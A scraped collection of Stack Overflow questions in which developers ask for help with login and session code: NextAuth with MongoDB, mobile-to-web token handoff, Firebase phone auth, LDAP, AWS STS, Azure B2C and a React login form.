    &lt;key&gt;CFBundleSignature&lt;/key&gt;
    &lt;string&gt;????&lt;/string&gt;
    &lt;key&gt;CFBundleURLTypes&lt;/key&gt;
    &lt;array&gt;
        &lt;dict&gt;
            &lt;key&gt;CFBundleTypeRole&lt;/key&gt;
            &lt;string&gt;Editor&lt;/string&gt;
            &lt;key&gt;CFBundleURLName&lt;/key&gt;
            &lt;string&gt;&lt;/string&gt;
            &lt;key&gt;CFBundleURLSchemes&lt;/key&gt;
            &lt;array&gt;
                &lt;string&gt;AppName&lt;/string&gt;
                &lt;string&gt;ios.AppName.app&lt;/string&gt;
            &lt;/array&gt;
        &lt;/dict&gt;
    &lt;/array&gt;
    &lt;key&gt;CFBundleVersion&lt;/key&gt;
    &lt;string&gt;1&lt;/string&gt;
    &lt;key&gt;LSRequiresIPhoneOS&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;NSAppTransportSecurity&lt;/key&gt;
    &lt;dict&gt;
        &lt;key&gt;NSAllowsArbitraryLoads&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;NSAllowsLocalNetworking&lt;/key&gt;
        &lt;true/&gt;
    &lt;/dict&gt;
    &lt;key&gt;NSCameraUsageDescription&lt;/key&gt;
    &lt;string&gt;$(PRODUCT_NAME) uses your camera to capture images of trading cards for the purpose of identifying and providing information about the cards using AI.&lt;/string&gt;
    &lt;key&gt;NSMicrophoneUsageDescription&lt;/key&gt;
    &lt;string&gt;Allow $(PRODUCT_NAME) to access your microphone&lt;/string&gt;
    &lt;key&gt;NSPhotoLibraryUsageDescription&lt;/key&gt;
    &lt;string&gt;Allow $(PRODUCT_NAME) to access your photos&lt;/string&gt;
    &lt;key&gt;UILaunchStoryboardName&lt;/key&gt;
    &lt;string&gt;SplashScreen.storyboard&lt;/string&gt;
    &lt;key&gt;UIRequiredDeviceCapabilities&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;armv7&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;UIRequiresFullScreen&lt;/key&gt;
    &lt;false/&gt;
    &lt;key&gt;UIStatusBarStyle&lt;/key&gt;
    &lt;string&gt;UIStatusBarStyleDefault&lt;/string&gt;
    &lt;key&gt;UISupportedInterfaceOrientations&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;UIInterfaceOrientationPortrait&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;UISupportedInterfaceOrientations~ipad&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;UIInterfaceOrientationLandscapeLeft&lt;/string&gt;
        &lt;string&gt;UIInterfaceOrientationLandscapeRight&lt;/string&gt;
        &lt;string&gt;UIInterfaceOrientationPortrait&lt;/string&gt;
        &lt;string&gt;UIInterfaceOrientationPortraitUpsideDown&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;UIUserInterfaceStyle&lt;/key&gt;
    &lt;string&gt;Light&lt;/string&gt;
    &lt;key&gt;UIViewControllerBasedStatusBarAppearance&lt;/key&gt;
    &lt;false/&gt;
&lt;/dict&gt;
&lt;/plist&gt;

</code></pre>
<p>AppDelegate.mm:</p>
<pre><code>#import &quot;AppDelegate.h&quot;

#import &lt;React/RCTBundleURLProvider.h&gt;
#import &lt;React/RCTLinkingManager.h&gt;



@implementation AppDelegate

- (BOOL)application:(UIApplication *)application
   openURL:(NSURL *)url
   options:(NSDictionary&lt;UIApplicationOpenURLOptionsKey,id&gt; *)options
{
  return [RCTLinkingManager application:application openURL:url options:options];
}

- (BOOL)application:(UIApplication *)application continueUserActivity:(nonnull NSUserActivity *)userActivity
 restorationHandler:(nonnull void (^)(NSArray&lt;id&lt;UIUserActivityRestoring&gt;&gt; * _Nullable))restorationHandler
{
 return [RCTLinkingManager application:application
                  continueUserActivity:userActivity
                    restorationHandler:restorationHandler];
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
  self.moduleName = @&quot;Artiflect&quot;;
  self.initialProps = @{};

  return [super application:application didFinishLaunchingWithOptions:launchOptions];
}

- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge
{
  return [self getBundleURL];
}

- (NSURL *)getBundleURL
{
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@&quot;.expo/.virtual-metro-entry&quot;];
#else
  return [[NSBundle mainBundle] URLForResource:@&quot;main&quot; withExtension:@&quot;jsbundle&quot;];
#endif
}
// Explicitly define remote notification delegates to ensure compatibility with some third-party libraries
- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken
{
  [super application:application didRegisterForRemoteNotificationsWithDeviceToken:deviceToken];
}

- (void)application:(UIApplication *)application didFailToRegisterForRemoteNotificationsWithError:(NSError *)error
{
  [super application:application didFailToRegisterForRemoteNotificationsWithError:error];
}

- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo fetchCompletionHandler:(void (^)(UIBackgroundFetchResult))completionHandler
{
  [super application:application didReceiveRemoteNotification:userInfo fetchCompletionHandler:completionHandler];
}

@end

</code></pre>
"
"<p>I'm just asking you to check this part because I'm working on a project related to Next.js and the session part doesn't seem to be working in the callback function during the login logic implementation</p>
<pre><code>import NextAuth from 'next-auth';
import CredentialsProvider from &quot;next-auth/providers/credentials&quot;;
import {connectDB} from &quot;@/util/mongoDbDatabase&quot;;
import {MongoDBAdapter} from &quot;@next-auth/mongodb-adapter&quot;;
import CustomCredentialsProvider from &quot;@/app/CredentialsProvider&quot;;
export const options = {
    providers: [
        CredentialsProvider({
                name: &quot;credentials&quot;,
                async authorize(credentials) {
                    const client = await connectDB
                    const db = client.db(&quot;yoong&quot;)
                    const user = await db.collection(&quot;member&quot;).findOne({userId : credentials.userId,   password : credentials.password})
                    if(!user){
                        return null
                    }
                    return user;
                },
        }),
    ],
    session: {
        strategy: 'session',
        maxAge: 30 * 24 * 60 * 60 //30일
    },
    callbacks: {
        async session(session, user) {
            const client = await connectDB
            const db = client.db(&quot;yoong&quot;)
            db.collection(&quot;session&quot;).insertOne(user)
            return session;
        },
    },
        adapter : await MongoDBAdapter(await connectDB),
        secret : process.env.NEXTAUTH_SECRET,
};

const CustomLoginPage = () =&gt; {
    return (
        &lt;div&gt;
            &lt;CustomCredentialsProvider/&gt;
        &lt;/div&gt;
    );
};
export default NextAuth(options);
export const CustomLogin = CustomLoginPage;
</code></pre>
<p>Basic logic implemented a personal login page to implement a login method as a session method and applied session information to MongoDB</p>
<pre><code>'use client'
import {useState} from &quot;react&quot;;
import {signIn} from &quot;next-auth/react&quot;;
import {useRouter} from &quot;next/navigation&quot;;
export default function CustomCredentialsProvider({session}) {
    let [id, setId] = useState(&quot;&quot;)
    let [password, setPassword] = useState(&quot;&quot;)
    let router = useRouter()
    async function handleSignIn(){
        const result = await signIn('credentials', {
            redirect: false, // 로그인 성공 시 자동으로 페이지를 이동하지 않도록 설정
            userId: id,
            password: password,
            callbackUrl: 'http://localhost:3000/main'
        });
        if(result.error !== undefined &amp;&amp; result.error !== null &amp;&amp; result.error !== &quot;&quot;){
            alert(&quot;로그인에 실패했습니다 사유 : &quot; + result.error)
        }else{
            alert(&quot;로그인 성공 : &quot; + result)
            console.log(result)
            await router.push(&quot;/main&quot;)
        }
    }
 
    return (
        &lt;div className=&quot;main&quot;&gt;
            &lt; img src=&quot;/ProjectYoongMain.png&quot; className=&quot;main-image&quot;&gt;&lt;/img&gt;
            &lt;div className=&quot;login&quot;&gt;
                &lt;h1&gt;Welcome To PJYoong&lt;/h1&gt;
                &lt;div className=&quot;input-login&quot;&gt;
                    &lt;p&gt;ID&lt;/p&gt;
                    &lt;input type=&quot;text&quot; onChange={(e)=&gt;{setId(e.target.value)}} placeholder=&quot;아이디를 입력하세요&quot; style={{right: 20 + &quot;px&quot;}}&gt;&lt;/input&gt;
                &lt;/div&gt;
                &lt;div className=&quot;input-login&quot;&gt;
                    &lt;p&gt;PW&lt;/p&gt;
                    &lt;input type=&quot;password&quot; onChange={(e)=&gt;{setPassword(e.target.value)}} placeholder=&quot;비밀번호를 입력하세요&quot;&gt;&lt;/input&gt;
                &lt;/div&gt;
                &lt;div className=&quot;f-right&quot;&gt;
                    &lt;button type=&quot;button&quot; onClick={
                        handleSignIn
                    }&gt;로그인&lt;/button&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    )
}
</code></pre>
<p>The above code is a custom login code. I'm sharing the reference</p>
<p>First of all, when I logged in before the problem, the login worked normally</p>
<pre><code>async function handleSignIn(){
        const result = await signIn('credentials', {
            redirect: false, // 로그인 성공 시 자동으로 페이지를 이동하지 않도록 설정
            userId: id,
            password: password,
            callbackUrl: 'http://localhost:3000/main'
        });
        if(result.error !== undefined &amp;&amp; result.error !== null &amp;&amp; result.error !== &quot;&quot;){
            alert(&quot;로그인에 실패했습니다 사유 : &quot; + result.error)
        }else{
            alert(&quot;로그인 성공 : &quot; + result)
            console.log(result)
            await router.push(&quot;/main&quot;)
        }
    }
 
</code></pre>
<p>When I took a log from the code above, I checked the login information normally, and the server also checked the user login information by checking the DB using the login information. But whether the next step, the callback, doesn't work</p>
<pre><code>  callbacks: {
        async session(session, user) {
            const client = await connectDB
            const db = client.db(&quot;yoong&quot;)
            db.collection(&quot;session&quot;).insertOne(user)
            return session;
        },
    },
</code></pre>
<p>Even if I log in from the code above, nothing comes out, and on the /main page that is accessed after login, it was confirmed that the session information was null when outputting the session information with the getServerSession() function. (I definitely logged in and received the login information.) The session information was not stored in the DB that stores the session. I would like to ask if there is anything I missed in that part
Additionally, I checked to see if session information was stored on other storage or cookies (not implemented as a feature, but did not check session information when login was complete), but there was no session information in local storage, session storage, and cookies either</p>
"
"<p>I have a mobile app built with react native, a nestjs API for the mobile app, and I'm working on a web app (nextjs).</p>
<p>The mobile app and API already have JWT based authentication built.  I am building the web app from scratch.</p>
<p>At an extremely high level, what I want to do is:</p>
<p>-In my mobile app, the user is already logged in</p>
<p>-The user presses on a button to launch the web app in the browser</p>
<p>-The browser opens the web app, and the user is already logged in.  I do not want the user to have to enter credentials at any point.</p>
<p>I'm trying to think of the best strategy for auth in this case. Here is what I've come up with:</p>
<p>1 - App user, already logged in, presses a button to open the web app</p>
<p>2 - App requests a one-time use token from API</p>
<p>3 - On receiving request, API:</p>
<p>3a - Creates a one-time token (OTT).  This token is a JWT with an identifier (uuid) in the payload and short expiry time (5m?)</p>
<p>3b - Stores a record in redis, with the identifier as key, an expiry equal to that of the JWT, and a value of the user’s App id</p>
<p>4 - The OTT is sent back to App in the response</p>
<p>5 - App constructs a link to the Store, passing in the OTT in the URL params</p>
<p>6 - The web app is opened in the browser and extracts the OTT from the URL</p>
<p>7 - The web app sends the OTT to API and requests a new token</p>
<p>8 - API verifies the OTT, extracts the identifier, and queries redis for the associated user.</p>
<p>9 - If a record is found, the API extracts the user’s App id from the redis store, immediately deletes the record from redis (ensuring the token can be used only once), and finally uses the extracted id to query the db for the user’s data</p>
<p>10 - API Creates a new JWT with the necessary user data</p>
<p>11 - API sends new JWT back to the web app inside an httponly cookie</p>
<p>12 - The web app receives the cookie and can make requests to the API</p>
<p>This is my first time implementing something like this from scratch, so I am mostly wondering if this is secure.  Passing the one time JWT from the mobile app to the web app in query params <em>feels</em> a bit sketchy to me, but because it has a short expiry and would be immediately invalidated, is it relatively secure?  Are there considerations I might not be making?</p>
<p>I have not tried to implement this yet, am mostly looking to see if it is a valid approach.  I am open to other solutions, but since I am working with an already built token-based auth flow between the mobile app and API, I'm not looking to implement solutions like OAuth at this time.</p>
<p>As always thank you!!</p>
"
"<p>I am trying to write a code to send the verification code to SMS using Firebase Phone Auth .
but i got this error message :
E/FirebaseAuth(23757): [SmsRetrieverHelper] SMS verification code request failed: unknown status code: 17093 null
error img <a href=""https://i.stack.imgur.com/bM18H.png"" rel=""nofollow noreferrer"">error img</a>
my code</p>
<pre><code>void phoneAuth() async {
 await FirebaseAuth.instance.verifyPhoneNumber(
  phoneNumber: &quot;+966534341376&quot;,
  verificationCompleted: verificationComplete,
      verificationFailed: (FirebaseAuthException e) {
        if (e.code == 'invalid-phone-number') {
           print(&quot;the phone number not valid&quot;);
        } else {
           print(e);
        }
      },
      codeSent: (String verificationId, int? resendToken) 
      async {
      
      },
     
      timeout: const Duration(seconds: 60),
      codeAutoRetrievalTimeout: (String verificationId) {},
      
   );
}
</code></pre>
<p>img of function
<a href=""https://i.stack.imgur.com/JNJ9e.png"" rel=""nofollow noreferrer"">function code img</a></p>
<p>here button calld function</p>
<pre><code>MaterialButton(
padding: EdgeInsets.symmetric(
   horizontal:
   smolewidt ? width * 0.12 : width * 0.28,vertical: 8),
     shape: RoundedRectangleBorder(borderRadius: n 
      BorderRadius.circular(15.0),
      side: BorderSide(color: Colors.white)),
      color: sharedPref.getBool(&quot;mode&quot;) ?? &quot;&quot; == true
            ? redColor.primaryColor
            : redColor.primaryColor,
             onPressed: () async {
             phoneAuth();
             },
              child: Text(&quot;تسجيل جديد&quot;,
              style: TextStyle(
              color: Colors.white,
              fontWeight: FontWeight.bold,
              fontSize: 19,
              fontFamily: &quot;NotoKufiArabic&quot;))),
</code></pre>
"
"<p>Team,</p>
<p>Need some help here.</p>
<p>I created gpt3.5 model deployment in Azure AI Studio and used &quot;Add your Data&quot; feature.</p>
<p>Added a pdf file to Azure AI search and fed to my model which is working absolutely fine in Chat Playground.</p>
<p>Deployed to Web App using the top right window option &quot;Deploy to a new web app &quot; in AI Studio. Post Deployment unable to access the web app.</p>
<p>Point 1 : Its asking to set up Authentication. Not allowing me to access by default</p>
<p>Point 2 : Added an Identity using Microsoft Service Principal. Now when attempted to access the web app its asking for Azure AD credentials(ID / Pwd)  which a service principal doesnt have.</p>
<p>Can anyone help here!</p>
"
"<p>I am working on Django Project and I want to setup authentication using LDAP backend. I have a form in UI where user will be able to enter user name and password and this will be passed to LDAP backend for authentication. While passing data from UI form to LDAP backend. DO I have to use any encryption technique? If yes, what kind of and how? Thank you.</p>
"
"<p>I am trying to authenticate MISP through LDAP, but I am not able to do it. I havve tried to look into the logs but I did't get anything.</p>
<p>What should happen is the following:</p>
<p>Connect to the misp web URL in your browser
The Apache web server asks for basic authentication. In most browsers a pop-up window will appear asking you for a username and password.
You will then be redirected to the MISP event page, no login is required. But in this step I got: <strong>ERROR &quot; INTERNAL SERVER ERROR&quot;</strong></p>
<p>My configuration is the following one:</p>
<p>In the file httpd.conf I added the following:</p>
<pre><code>&lt;Location &quot;/&quot;&gt;
 
        # Basic authentication with LDAP against MS AD
 
        AuthType Basic
        AuthBasicProvider ldap
        AuthLDAPURL ldap://xxxx:389/dc=xxxx,dc=xxxx?cn?sub
        AuthLDAPBindDN &quot;cn=Manager,dc=xxxx,dc=xxxx&quot;
        AuthLDAPBindPassword &quot;xxxxxxx&quot;
        AuthLDAPInitialBindAsUser on
        Require valid-user
 
&lt;/Location&gt;
</code></pre>
<p>In the file /var/www/MISP/app/Config/config.php I added the following:</p>
<pre><code>
'ApacheSecureAuth' =&gt; array(
                        'apacheEnv'          =&gt; 'REMOTE_USER', 
                        'ldapServer'         =&gt; 'ldap://xxxx',
                        'ldapProtocol'       =&gt; 3,
                        'ldapNetworkTimeout' =&gt; -1,  
                        // Note that we need a service account here.
                        'ldapReaderUser'     =&gt; 'CN=Manager,OU=xxx,DC=xxx,DC=xxx', 
                        'ldapReaderPassword' =&gt; 'xxxx',
                        'ldapDN'             =&gt; 'OU=xxxx,DC=xxx,DC=xxx',
                        'ldapSearchFilter'   =&gt; '', // I don't use that. Maybe you should
                        'ldapSearchAttribut' =&gt; 'uid',  // Make sure this match and works for you
                        'ldapFilter'         =&gt; array('mail',),
                        'ldapDefaultRoleId'  =&gt; 3,   // this will create users
                        'ldapDefaultOrg'     =&gt; '1',      // uses 1st local org in MISP if undefined,
                        'ldapAllowReferrals' =&gt; false,   // allow or disallow chasing LDAP referrals - see what$
                        'ldapEmailField' =&gt; array('mail'), // whatever works for you
        ),
</code></pre>
"
"<p>We have 2 routes for user registration <code>/signup</code> and <code>/verifyOtp</code>.</p>
<p>Both routes are working fine in Postman and backend:</p>
<ul>
<li>the user email is getting verified by otp cross-checking</li>
<li>the data is pushing to the database.</li>
</ul>
<p>In the React frontend the first route is working fine, and data can be stored in the session. But in the second route, data cannot be extracted from the session and the console prints <code>undefined</code>.</p>
<pre class=""lang-js prettyprint-override""><code>async verifyOtp(req: Request, res: Response): Promise &lt; void &gt; {
  try {
    console.log(&quot;user &quot; + req.session.user)
    const otp = req.body.otp;
    console.log(&quot;otp.................&quot; + otp)
    console.log(req.session)
    const userData = req.session.user;
    console.log(&quot;session stored userdata :&quot;, userData)
    const email = userData.email;
    const password = userData.password;
    const name = userData.name;
    const phone = userData.phone;
    const otpCode = userData.otpCode;
    console.log(&quot;session............&quot;)
    if (otp === otpCode) {
      const user = await signup(email, password, name phone);
      res.status(201).json(user);
    } else {
      res.status(400).json({
        error: &quot;Invalid otp !!&quot;
      });
    }
  } catch (error) {
    console.log(error);
    res.status(500).json({
      message: &quot;Server Error&quot;
    })
  }
},
</code></pre>
"
"<p>I am facing issue.
I need to write automation test. I am using JAVA with Playwright. Went through a lot of discussions.
Trying to login in from my computer. Even when Playwright is starting session in &quot;incognito mode&quot; it still taking my personal credentials from the computer. I need to use some user that we are using for the aut. test. And I am to be honest I just don't know how to handle that. I have tried to use the setArgs, which I think its not working. And we are pushed to use the &quot;msedge&quot; for the testing. Can somebody help me out ?
This is my snippet:</p>
<pre><code>public Page initBrowser(Properties prop) {
        String browserName = prop.getProperty(&quot;browser&quot;).trim();
        System.out.println(&quot;browser name is : &quot; + browserName);

        playwright = Playwright.create();
        //browser logic - have to pass the browserName

        switch (browserName.toLowerCase()) {
            case &quot;msedge&quot;:
                browser = playwright.chromium().launch(new BrowserType.LaunchOptions().setSlowMo(500).setHeadless(false).setArgs(Collections.singletonList(&quot;--auth-server-allowlist=\&quot;_\&quot;&quot;)));
                break;
            case &quot;chromium&quot;:
            case &quot;chrome&quot;:
                browser = playwright.chromium().launch(new BrowserType.LaunchOptions().setHeadless(false).setArgs(Collections.singletonList(&quot;--auth-server-allowlist=\&quot;_\&quot;&quot;)).setArgs(Collections.singletonList(&quot;-inprivate&quot;)));
                break;

            default:
                System.out.println(&quot;Invalid browser name. Please pass a valid browser name.&quot;);
                return null;
        }

        if (browser != null) { // Ensure a valid browser instance
            browserContext = browser.newContext(new Browser.NewContextOptions().setIgnoreHTTPSErrors(true).setHttpCredentials(&quot;username&quot;, &quot;password&quot;));
            page = browserContext.newPage();
            page.navigate(prop.getProperty(&quot;url&quot;).trim());
            return page;
        } else {
            // Handle cases where browser launch failed
            return null;
        }
    }
</code></pre>
<p>I have tried to implement some solutions which have worked for others from python or typescript.</p>
"
"<p>I am trying to Assume a Role through the Powershell AWS SDK using a bearer token that I got from my IDP already.  I have a proper IAM Role already set up and can test the entire flow  correctly using the Powershell AWS CLI.  I cannot use CLI for my end goal for various reasons.</p>
<p>Here is the code I am using with CLI that works</p>
<pre><code>$TOKEN = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(&quot;Client ID:Client Secret&quot;))
$ACCESS_TOKEN = Invoke-WebRequest -Uri &quot;Issuer URI&quot; -Method POST -Headers @{&quot;accept&quot; = &quot;application/json&quot;; &quot;authorization&quot; = &quot;Basic $TOKEN&quot;; &quot;cache-control&quot; = &quot;no-cache&quot;; &quot;content-type&quot; = &quot;application/x-www-form-urlencoded&quot;} -Body @{&quot;grant_type&quot; = &quot;client_credentials&quot;} | Select-Object -ExpandProperty Content | ConvertFrom-Json | Select-Object -ExpandProperty access_token

aws sts assume-role-with-web-identity  --role-arn Role ARN   --role-session-name RAQF ID-Session Name  --web-identity-token $ACCESS_TOKEN | jq .Credentials
</code></pre>
<p>Here is the code I am trying with the SDK (remove private info)</p>
<pre><code>$TOKEN = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('clientID:clientsecret'))
$bearerToken = Invoke-WebRequest -Uri 'https://autheserver.com/token' -Method POST -Headers @{&quot;accept&quot; = &quot;application/json&quot;; &quot;authorization&quot; = &quot;Basic $TOKEN&quot;; &quot;cache-control&quot; = &quot;no-cache&quot;; &quot;content-type&quot; = &quot;application/x-www-form-urlencoded&quot;} -Body @{&quot;grant_type&quot; = &quot;client_credentials&quot;} | Select-Object -ExpandProperty Content | ConvertFrom-Json | Select-Object -ExpandProperty access_token



$roleArn = &quot;arn:aws:iam::99999999:role/system-roles/transfer/agent&quot;
$roleSessionName = &quot;99j1925-transfer&quot;
$webIdentityToken = $bearerToken

$stsClient = New-Object -TypeName Amazon.SecurityToken.AmazonSecurityTokenServiceClient
$assumeRoleRequest = New-Object -TypeName Amazon.SecurityToken.Model.AssumeRoleWithWebIdentityRequest -Property @{
    RoleArn = $roleArn
    RoleSessionName = $roleSessionName
    WebIdentityToken = $webIdentityToken
    DurationSeconds = 3600
}

$assumeRoleResponse = $stsClient.AssumeRoleWithWebIdentityAsync($assumeRoleRequest)
</code></pre>
<p>This returns back an error of:</p>
<p><strong>System.AggregateException: One or more errors occurred. ---&gt; Amazon.Runtime.AmazonServiceException: Unable to get IAM security credentials from EC2 Instance
Metadata Service.</strong></p>
"
"<p>I'm developing a Flutter App and I've implemented the login using the library aad_b2c_webview and a webpage.
I have a different behaviour between iOS and Android.
On Android, using version 0.0.51 everything works fine, but once I try to use a newer version I get this error:</p>
<blockquote>
<p>Response ({&quot;error&quot;:&quot;invalid_request&quot;,&quot;error_description&quot;:&quot;AADB2C90117: The scope 'openid%20offline_access%20profile%20https://myWebSite.onmicrosoft.com/exm.be.webapi/access_as_user' provided in the request is not supported.\r\nCorrelation ID: 53dc1c3f-a814-428c-8adf-a3153d5eb8b3\r\nTimestamp: 2024-03-07 13:24:06Z\r\n&quot;})</p>
</blockquote>
<p>On iOS I seem to get the error while using an earlier version.
Everything works fine using version later than 0.0.53.</p>
<p>Reading the changelog on its page <a href=""https://pub.dev/packages/aad_b2c_webview/changelog"" rel=""nofollow noreferrer"">https://pub.dev/packages/aad_b2c_webview/changelog</a> it doesn't seem to have nothing new outside of new functions and fixes.</p>
<p>My implementation of the webview is</p>
<pre><code>return ADB2CEmbedWebView(
      loadingReplacement: const Loading(),
      optionalParameters: const [],
      tenantBaseUrl: aadB2CUserAuthFlow,
      userFlowName: aadB2CUserFlowName,
      clientId: aadB2CClientID,
      redirectUrl: aadB2CRedirectURL,
      onRedirect: (context) =&gt; Loading.modalLoading(),
      scopes: aadB2CScopes,
      onAnyTokenRetrieved: (Token anyToken) {
        ...
      },
      onIDToken: (Token token) {
        ...
      },
      onAccessToken: (Token token) {
        ...
      },
      onRefreshToken: (Token token) {
        ...
      },
    );
</code></pre>
<p>I've tried all the version on both devices and Android stop working after 0.0.51, iOS on the other hand starts working after 0.0.53
What am I missing?</p>
"
"<p>I coded an authentification interface, that works but not like I wanted to.</p>
<p>I do connect when clicking on &quot;connexion&quot; but even without entering any datas in my inputs.</p>
<p>I did add a yup schema validation but it dosn't seem to work.</p>
<pre><code>import React, { useState } from &quot;react&quot;;
import {
  Box,
  Button,
  Checkbox,
  FormControlLabel,
  TextField,
  Typography,
} from &quot;@mui/material&quot;;

import axios from &quot;axios&quot;;
import { LoginFormProps } from &quot;../types/loginFormProps&quot;;
import { Controller, useForm } from &quot;react-hook-form&quot;;

import { yupResolver } from &quot;@hookform/resolvers/yup&quot;;
import * as yup from &quot;yup&quot;;
import ErrorMessage from &quot;./ErrorMessage&quot;;

const schema = yup.object({
  username: yup
    .string()
    .required(&quot;Ce champ est obligatoire&quot;)
    .max(40, &quot;Moins de 40 stp&quot;),
  password: yup
    .string()
    .required(&quot;Ce champ est obligatoire&quot;)
    .email(&quot;Email invalide&quot;),
});

const LoginForm: React.FC&lt;LoginFormProps&gt; = ({ token, setToken }) =&gt; {
  const [username, setUsername] = useState(&quot;&quot;);
  const [password, setPassword] = useState(&quot;&quot;);
  const [error, setError] = useState(&quot;&quot;);

  const loginHandler = () =&gt; {
    axios({
      url: &quot;https://fakestoreapi.com/auth/login&quot;,
      method: &quot;POST&quot;,
      headers: {
        &quot;Content-Type&quot;: &quot;application/json&quot;,
      },
      data: {
        username: &quot;mor_2314&quot;,
        password: &quot;83r5^_&quot;,
      },
    })
      .then((res) =&gt; {
        console.log(res.data.token);
        setToken(res.data.token);
        localStorage.setItem(&quot;userToken&quot;, res.data.token);
      })
      .catch((error) =&gt; {
        console.log(error.response);
        setError(error.response.data);
      });
  };

  const {
    control,
    formState: { errors },
  } = useForm({
    defaultValues: {
      username: &quot;&quot;,
      password: &quot;&quot;,
    },
    resolver: yupResolver(schema),
  });
  console.log(schema);

  return (
    &lt;form onSubmit={loginHandler}&gt;
      &lt;Box
        sx={{
          display: &quot;flex&quot;,
          flexDirection: &quot;column&quot;,
          mt: &quot;15rem&quot;,
          alignItems: &quot;start&quot;,
          pl: &quot;20rem&quot;,
          pr: &quot;20rem&quot;,
          borderRadius: &quot;11px&quot;,
          background: &quot;white&quot;,
          width: &quot;35%&quot;,
          padding: &quot;2rem&quot;,
          margin: &quot;20rem&quot;,
        }}
      &gt;
        &lt;Box&gt;
          &lt;Typography
            variant=&quot;h2&quot;
            sx={{
              fontSize: &quot;2rem&quot;,
              mb: &quot;1rem&quot;,
              color: &quot;#666d92&quot;,
            }}
          &gt;
            Accédez à{&quot; &quot;}
          &lt;/Typography&gt;
          &lt;Typography
            variant=&quot;h1&quot;
            sx={{
              fontSize: &quot;2.5rem&quot;,
              color: &quot;#0909ff&quot;,
            }}
          &gt;
            Tuto-React
          &lt;/Typography&gt;
        &lt;/Box&gt;
        {/* FORM */}
        &lt;Box sx={{ width: &quot;100%&quot;, mt: &quot;2rem&quot; }}&gt;
          &lt;Controller
            name=&quot;username&quot;
            control={control}
            render={({ field }) =&gt; (
              &lt;TextField
                {...field}
                value={username}
                onChange={(e: React.ChangeEvent&lt;HTMLInputElement&gt;) =&gt;
                  setUsername(e.target.value)
                }
                name=&quot;username&quot;
                label=&quot;Email&quot;
                type=&quot;text&quot;
                fullWidth
                sx={{ mb: &quot;1rem&quot; }}
                error={!!errors.username}
              /&gt;
            )}
          /&gt;
          {errors.username &amp;&amp; (
            &lt;ErrorMessage message={errors.username?.message} /&gt;
          )}
          &lt;Controller
            name=&quot;password&quot;
            control={control}
            render={({ field }) =&gt; (
              &lt;TextField
                {...field}
                value={password}
                onChange={(e: React.ChangeEvent&lt;HTMLInputElement&gt;) =&gt;
                  setPassword(e.target.value)
                }
                name=&quot;password&quot;
                label=&quot;Mot de passe&quot;
                type=&quot;password&quot;
                fullWidth
                sx={{ mb: &quot;1rem&quot; }}
                error={!!errors.password}
              /&gt;
            )}
          /&gt;

          {errors.password &amp;&amp; (
            &lt;ErrorMessage message={errors.password?.message} /&gt;
          )}

          &lt;Box sx={{ ml: &quot;1rem&quot; }}&gt;
            &lt;FormControlLabel
              control={&lt;Checkbox /&gt;}
              label=&quot;Se souvenir de moi&quot;
            /&gt;
          &lt;/Box&gt;
          &lt;Button onClick={loginHandler} fullWidth sx={{ mt: &quot;1rem&quot; }}&gt;
            Connexion
          &lt;/Button&gt;
        &lt;/Box&gt;
      &lt;/Box&gt;
    &lt;/form&gt;
  );
};

export default LoginForm;

</code></pre>
<p>I'm using fake store API to generate a fake token and is stored in local.storage</p>
<p>here is my rule which display my login form :</p>
<pre><code>import { ThemeProvider } from &quot;@mui/material/styles&quot;;
import CssBaseline from &quot;@mui/material/CssBaseline&quot;;
import { theme } from &quot;@docaposte-agility/da-design-system&quot;;
import Listing from &quot;./components/Listing&quot;;
import { Container } from &quot;@mui/material&quot;;
import LoginForm from &quot;./components/LoginForm&quot;;
import { useState } from &quot;react&quot;;
import NavBar from &quot;./components/NavBar&quot;;

function App() {
  const [token, setToken] = useState(localStorage.getItem(&quot;userToken&quot;) ?? null);

  return (
    &lt;&gt;
      &lt;ThemeProvider theme={theme}&gt;
        &lt;CssBaseline /&gt;
        {token ? &lt;NavBar setToken={setToken} /&gt; : null}
        &lt;Container maxWidth=&quot;md&quot;&gt;
          {token ? (
            &lt;Listing /&gt;
          ) : (
            &lt;LoginForm
              token={token}
              setToken={setToken}
              password={&quot;&quot;}
              email={&quot;&quot;}
            /&gt;
          )}
        &lt;/Container&gt;
      &lt;/ThemeProvider&gt;
    &lt;/&gt;
  );
}

export default App;

</code></pre>
<p>Can you help me to fix it ?</p>
"
"<p>I am working on a web application whose back-end uses Django and front-end uses Next.js 14. I want to obtain a JWT token from the API and save it to an HTTP-only cookie. To implement logic for protected paths, I need to send this token to the back-end using the API and check if it’s valid. How can I save this token in an HTTP-only cookie and how can I access this token?</p>
<p>Another question I have is about displaying user-specific content on their profile page. Is there any parameter that I need to obtain from the login and signup API when a user is authorized, in order to display their specific content? For example, a userID or something similar</p>
<p>this is the api that i implemented in app/api path for signup:</p>
<pre><code>// app/api/signup/route.js
export default async function handler(req, res) {
    if (req.method === 'POST') {
      try {
        // Send credentials to your backend
        const { email, password,confirm_password,phone_number } = req.body;
        const backendResponse = await fetch('api/accounts/signup/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password ,confirm_password,phone_number}),
        });
  
        const data = await backendResponse.json();
  
        if (data.jwt) {
          res.setHeader('Set-Cookie', `token=${data.jwt}; HttpOnly; Path=/;`);
          res.status(200).json({ success: true });
        } else {
          res.status(401).json({ success: false, error: 'Authentication failed' });
        }
      } catch (error) {
        res.status(500).json({ success: false, error: 'Internal server error' });
      }
    } else {
      res.setHeader('Allow', ['POST']);
      res.status(405).end(`Method ${req.method} Not Allowed`);
    }
  }
  
</code></pre>
<p>and this is the way I fetch this api in my signup page:</p>
